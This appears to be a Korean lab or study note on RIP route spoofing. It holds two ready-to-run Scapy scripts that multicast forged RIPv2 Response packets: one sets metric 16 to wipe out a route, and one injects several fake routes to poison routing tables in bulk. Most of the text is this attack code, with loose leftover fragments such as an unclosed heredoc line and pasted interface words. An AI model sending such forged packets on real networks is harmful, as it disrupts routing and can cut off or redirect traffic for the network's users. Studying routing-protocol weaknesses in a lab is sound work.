1. 네트워크를 죽이는 RIP 패킷 (metric=16)
핵심 개념: RIP에서 metric=16은 unreachable (도달 불가능)
이를 이용해 기존 라우팅 정보를 의도적으로 제거(무효화) 가능

from scapy.all import *
from scapy.layers.rip import RIP, RIPEntry

# 1. RIP 멀티캐스트 전송 대상 설정
rip_ip = IP(dst="224.0.0.9") 
rip_udp = UDP(sport=520, dport=520) 

# 2. RIP 헤더 생성 (cmd=2: Response)
rip_header = RIP(cmd=2, version=2)

# 3. 위조된 RIP 라우팅 정보 구성 : 아래 경로를 제거 시킴
dead_entry = RIPEntry(AF=2, RouteTag=0, addr="1.1.30.0", mask="255.255.255.0", nextHop="0.0.0.0", metric=16)
             
rip_packet = IP(dst="224.0.0.9")/UDP(sport=520, dport=520)/RIP(cmd=2, version=2)/dead_entry

send(rip_packet, iface="eth0", count=10)
print(">> 1.1.30.0/24 경로 제거 RIP 패킷 전송 완료")

---------------

cat << EOF > rip_spoofing2.py

------------------------
✅ 2. 다수 RIPEntry 포함 - 대량 테이블 오염
핵심 개념:
하나의 RIP Response 패킷에 여러 경로 정보를 담을 수 있음

라우팅 테이블을 빠르게 오염시킬 수 있음

실습 코드 예시:
python
복사
편집
entries = [
    RIPEntry(AF=2, RouteTag=0, addr="10.10.10.0", mask="255.255.255.0", nextHop="0.0.0.0", metric=1),
    RIPEntry(AF=2, RouteTag=0, addr="172.16.0.0", mask="255.255.0.0", nextHop="0.0.0.0", metric=1),
    RIPEntry(AF=2, RouteTag=0, addr="192.168.123.0", mask="255.255.255.0", nextHop="0.0.0.0", metric=1)
]

rip_packet = IP(dst="224.0.0.9")/UDP(sport=520, dport=520)/RIP(cmd=2, version=2)/entries
send(rip_packet, iface="eth0", count=1)
print(">> 여러 위조 경로 포함 RIP 패킷 전송 완료")
